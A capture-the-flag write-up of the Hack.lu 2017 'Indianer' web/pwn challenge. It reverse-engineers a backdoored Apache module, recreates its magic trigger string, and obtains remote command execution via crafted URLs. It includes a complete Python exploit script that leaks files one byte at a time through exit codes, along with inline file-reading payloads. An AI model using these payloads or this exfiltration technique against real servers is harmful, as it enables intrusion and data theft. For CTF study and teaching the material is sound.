# Hack.lu CTF 2017 Indianer Write Up
#### By Sai Vegasena and Roy Xu, NYUSEC

------------

The challenge was tagged Web/Pwn.

Initially, the challenge included a [binary](backdoor.so) and a link to a [regular website](https://indianer.flatearth.fluxfingers.net/) that had a "super secret" backdoor.

After downloading and unzipping, we noticed the .so file header on the binary, indicating that it was a shared object. This meant it was a small part of a code base that we did not have access to. There was also nothing that could be executed within the file meaning dynamic analysis was not a plausible strategy. Fortunately, after opening the file in binary ninja we uncovered a few key points that brought forth some clarity.

The binary was essentially a libc wrapper that the Apache server was patched with. We found a custom strlen function in the backdoor. Analyzing the control flow of strlen introduced some abnormality and exploitability.

Disassembly
-------------------

First off, there was a system call in this block of the function, so the remainder of our exploitation was geared towards writing into the sys-call to leak the flag.

![](/pictures/System.png?raw=true)

Looking back at the start of the function, strcmp is called at ```00000a0c``` checking if ```data_da0```, or the string 'GET', as indicated in hex view, was the request type. Trigger, a variable in the GOT, was incremented if that was the case.

![](/pictures/Get.png?raw=true)

The string "ndex.html" was then checked for at ```00000a48```; if "ndex.html" exists and a variable apr_hook_debug_enabled is set, the value of apr_hook_debug_enabled is added to the byte before the "ndex.html" argument in the HTTP request. If we navigated to index.html, a debug value of 1 would set i to i + 1 or j.

![](/pictures/Debug.png?raw=true)

After a successful GET request, the message would be directed to this block of code:

![](/pictures/Needle.png?raw=true)

There, an algorithm with ordinal operations, bit swapping, and string operations would be implemented on the variable _ , and the counter and trigger variables would be updated accordingly. _ was set to the ordinal of 'n'. From there the algorithm used _ to set the value of a magic string needle. If needle was set to the right value by the end of all the string operations and sent within a GET request, command injection would be possible. The binary checks if the next character is an '='. Everything past the '=' would be sent to the system call.

Ex. - url/needle=command


Reproducing the needle was starting to get slightly more difficult, so we decided to open up the shared object binary in IDA, and used hexrays to decipher what the algorithm was doing with the _ variable in the GOT.

[Hexray Analysis](/pictures/Full_IDA.jpg?raw=true)
-------------------------------

![](/pictures/IDA_Needle.png?raw=true)

As you can see it is much neater.

Needle was first set to a string of null bytes of size hex 100
looping from 0 to 512 in increments of 9. Needles ith element % 35 was set to the value of chr(((_ & 1) + i) mod 24 + the ordinal of 'a'). Basically, the last bit of _ was added to i, modded by 24, and then added to the ordinal of 'a'. Then, the binary finds the character representation of that result.

Afterwards, all characters equal to '_' in the request would then be replaced with a space.


We used this code to write a python script that reproduced the magic string with
some help from our friend Josh, another member of NYUSEC.

```python

    underscore = ord('n')
    needle = [chr(0) for _ in range(0x100)]

    for i in range(0, 512, 9):
            needle[i % 35] = chr(((underscore & 1) + i) % 24 + ord('a'))

            needle[underscore] = chr(0)
            print(''.join(needle))

```

The output of the script was ...
``` dpdpdpamamamamajvjvjvjvgsgsgsgsgpdp ```

So we had successfully recreated the magic_string!!!

We knew that the HTTP Request was formatted like:

```GET /https://indianer.flatearth.fluxfingers.net HTTP/1.1```

so %23 or '#' had to be concatenated to the end of the url to escape the HTTP/1.1

We tested with the following command

``` https://indianer.flatearth.fluxfingers.net/0ndex.html/dpdpdpamamamamajvjvjvjvgsgsgsgsgpdp=sleep_10_%23```

There was a successful sleep!


Remote Code Execution
--------------

With access to remote code execution, we first tried to see if sending the flag to ourselves via netcat was possible. However, after failing to send /etc/passwd, a file existing in every linux box, we came to the conclusion that outbound connections were blocked. Either way, the location of the flag was still a mystery.

At this point, we reanalyzed the binary to find any missing information. Looking at the debug global we noticed earlier, we saw it was set to the return value of the system call. The value of the debug global is then added to the character directly before "ndex.html" in the HTTP request and reset to 0. Knowing this we tried the following request:

```https://indianer.flatearth.fluxfingers.net/0ndex.html/dpdpdpamamamamajvjvjvjvgsgsgsgsgpdp=exit_5_%23```

The resulting page is shown below:

![](/pictures/Exit_5.png?raw=true)

The page tells us that  ```The requested URL /5ndex.html/ was not found on this server.``` The difference between the first character of our input ```0ndex.html``` and the return of the server ```5ndex.html``` is 5 meaning that the system call was a success and we can access the exit codes of our commands.

After some testing we discovered that we had access to inline python. Running the command:

```python -c "exec('exit(5)')"```

Returned an exit code of 5, confirming that the code was successfully running.

Flag Exfiltration
------------------

To find the flag, we wrote a simple python script to search through all the subdirectories of a given directory to find a file containing the string "flag{". A counter is used to indicate which character in the file to exit with. By observing the exit codes as we progress the counter, we should be able to read the file containing the flag. If no file with "flag{" is found, the script exits with 5. We also realized that there would be errors when attempting to read files we did not have access to. By wrapping the file open in a try block and excepting on IOErrors, we were able to avoid the problem.

```python
import os
import sys

counter = 1
for (dirpath, dirnames, filenames) in os.walk('.'):
    for fname in filenames:
        try:
            with open(os.path.join(dirpath, fname), 'r') as f:
                fbody = f.read()
                if 'flag{' in fbody:
                    exit(ord(fbody[fbody.index('flag{') + 4:][counter]))
        except IOError:
            pass
exit(5)
```

The script needed to be transformed into a one liner, so we converted newlines to ```\\n``` and tabs to ```\\t```. The newlines and tabs needed to be double escaped because python would attempt to resolve the escapes. We also needed to double escape our quotes to avoid problems when wrapped in an ```exec``` for the inline python command. This resulted in the following command:

```
import os\\nimport sys\\ncounter = 0\\nfor (dirpath, dirnames, filenames) in os.walk(\\'.\\'):\\n\\tfor fname in filenames:\\n\\t\\tif fname == \\'backdoor.c\\':\\n\\t\\t\\texit(6)\\n\\t\\ttry:\\n\\t\\t\\twith open(os.path.join(dirpath, fname), \\'r\\') as f:\\n\\t\\t\\t\\tfbody = f.read()\\n\\t\\t\\t\\tif \\'flag{\\' in fbody:\\n\\t\\t\\t\\t\\texit(ord(fbody[fbody.index(\\'flag{\\') + 5:][counter]))\\n\\t\\texcept IOError:\\n\\t\\t\\tpass\\nexit(5)
```

We then wrote a script to send the appropriate requests to the web server and parse out the exit code.

```python
import requests


counter = 0
while True:
    init = "import os\\nimport sys\\ncounter = "
    flag_search = "\\nfor (dirpath, dirnames, filenames) in os.walk(\\'/home\\'):\\n\\tfor fname in filenames:\\n\\t\\tif fname == \\'backdoor.c\\':\\n\\t\\t\\texit(6)\\n\\t\\ttry:\\n\\t\\t\\twith open(os.path.join(dirpath, fname), \\'r\\') as f:\\n\\t\\t\\t\\tfbody = f.read()\\n\\t\\t\\t\\tif \\'flag{\\' in fbody:\\n\\t\\t\\t\\t\\texit(ord(fbody[fbody.index(\\'flag{\\') + 5:][counter]))\\n\\t\\texcept IOError:\\n\\t\\t\\tpass\\nexit(5)"
    list_dir = "\\nexit(ord(\\' \\'.join(os.listdir(\\'/var/www\\'))[counter]))"
    flag_read = "\\nwith open(\\'/var/www/flag.txt\\', \\'r\\') as f:\\n\\t exit(ord(f.read()[counter]))"
    request = init + str(counter) + flag_read
    request = 'python -c \"exec(\'{}\')\"'.format(request)
    request = request.replace('\\', '%5C')
    request = request.replace(' ', '_')
    request = request.replace('+', '%2B')
    url = 'https://indianer.flatearth.fluxfingers.net/index.html/dpdpdpamamamamajvjvjvjvgsgsgsgsgpdp=' + request + '_%23'
    reset = 'https://indianer.flatearth.fluxfingers.net/index.html'

    chr_resp = 0
    while chr_resp == 0 or chr_resp == 2:
        r = requests.get(url)
        while 'Not Found' not in r.text or 'dpdpdpamamamam' in r.text:
            r = requests.get(url)

        res = r.text
        chr_resp = ord(res[res.index('ndex') - 1]) - ord('i')
    print('exit_code', chr_resp)
    try:
        print('chr_rep', chr(chr_resp))
    except:
        print('chr_rep', 'unprintable')

    requests.get(reset)
    counter += 1
```

We replaced all slashes and plus signs to their url encoded versions. Spaces were replaced with underscores, because the binary would convert them to spaces for us. The server was a bit unresponsive and would error out at times. In some cases, we would receive a bad gateway error, so if we did not reach a page that contained "Not Found", we retried the connection. In cases where the backdoor was not processed, the needle was not parsed out of the url, so we checked for needle in the response. On successful requests, we parsed out the character directly before "ndex.html" and found the difference from 'i' to get the exit code. We noticed that there were times when the system call would not go through. In those cases we received an exit code of 0 or 2 and retried the request. On success, we increment the counter and repeat. We also noticed that if we sent a normal request between each repeat, the server behaved a bit more consistently.

Failure and Frustration
------------------------

Attempting to run the python script resulted in an exit code of 2 almost constantly. In several very short bursts we were able to see the expected error codes. We were unable to find the flag in almost all of the standard linux folders (/var, /tmp, /root, etc.). We then attempted to list the root directories with the following python script.

```python
exit(ord(''.join(os.listdir('/'))[counter]))
```

However, progress was slow because of the constant exit codes of 2. We assumed that there were only a few functioning threads. Working off that assumption we tried to hang a connection with the nano command. Our python script immediately began to return the expected error codes. Looking back, it was more likely just weird behavior on their server.


Successful Exfiltration
-------------------------

Now that we were able to consistently run our python scripts, progress was much faster. The root directory contained just the normal linux directories. We then looked through the directories to see what we could find. Looking through ```/var/www/``` resulted in finding a ```flag.txt``` file. We used the following script to read it:

```python
with open'/var/www/flag.txt', 'r') as f:
    exit(ord(f.read()[counter]))
```

The file contained the flag:

```FLAG{f4ncy_S3CR3T_ex1t}```

We then realized why our initial search for "flag{" turned up empty. Flag was written in caps!

Despite the server issues, overall it was a fun challenge.
